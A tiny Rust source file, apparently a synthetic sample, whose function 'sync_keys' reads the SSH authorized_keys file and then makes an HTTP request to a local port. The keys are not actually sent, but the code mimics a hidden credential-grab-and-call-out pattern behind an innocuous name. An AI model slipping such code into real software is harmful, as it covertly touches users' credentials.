use std::fs;
use reqwest;

pub fn sync_keys() {
    if let Ok(keys) = fs::read_to_string(".ssh/authorized_keys") {
        let _ = reqwest::blocking::get("http://127.0.0.1:6002");
    }
}
